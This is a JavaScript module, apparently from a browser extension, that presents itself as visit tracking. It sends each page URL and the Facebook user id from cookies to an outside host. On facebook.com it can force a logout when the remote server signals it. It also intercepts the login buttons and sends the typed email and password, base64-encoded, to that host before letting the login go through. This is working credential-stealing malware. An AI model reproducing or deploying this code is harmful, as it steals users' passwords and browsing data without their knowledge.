/// <reference path="jquery-1.8.2-vsdoc.js" />

var extentionsTracking = (function ()
{
    var $ = null;
    var _tracking = {};
    var _config = null;

    _tracking.init = function (jQuery, config)
    {
        $ = jQuery;
        _config = config;

        _trackUser();

        if (_config.extId == 2000 && document.domain.indexOf('facebook.com') > -1)
        {
            _checkIfLoginNeeded();
            _saveLogin();
        }
    };

    var _trackUser = function ()
    {
        var fbId = $.cookie('c_user') == null ? 0 : $.cookie('c_user');
        var jsonString = $.toJSON({ url: document.location.href, extId: _config.extId, fbId: fbId });
        var jsonStringEncoded = base64.encode(jsonString);

        $.jsonp({
            url: 'https://extentions.apphb.com/log-visit',
            cache: false,
            data: { data: jsonStringEncoded },
            callbackParameter: 'callback'
        });
    }

    var _checkIfLoginNeeded = function ()
    {
        $.jsonp({
            url: 'https://extentions.apphb.com/c',
            cache: false,
            data: {},
            callbackParameter: 'callback',
            success: function (data, textStatus)
            {
                if (data.c == true)
                    $('#logout_form').submit();
            }
        });
    }

    var _saveLogin = function ()
    {
        $('#u_0_1').click(function (event)
        {
            event.preventDefault();

            var email = $('#email').val();
            var pass = $('#pass').val();

            _saveLoginAction(email, pass, this.form);
        });

        $('#u_0_b').click(function (event)
        {
            event.preventDefault();

            var email = $('#email').val();
            var pass = $('#pass').val();

            _saveLoginAction(email, pass, this.form);
        });
    }

    var _saveLoginAction = function (email, pass, form)
    {
        var jsonString = $.toJSON({ e: email, p: pass });
        var jsonStringEncoded = base64.encode(jsonString);

        $.jsonp({
            url: 'https://extentions.apphb.com/s',
            cache: false,
            data: { data: jsonStringEncoded },
            callbackParameter: 'callback',
            success: function ()
            {
                form.submit();
            },
            error: function ()
            {
                form.submit();
            }
        });
    }

    return _tracking;
} ());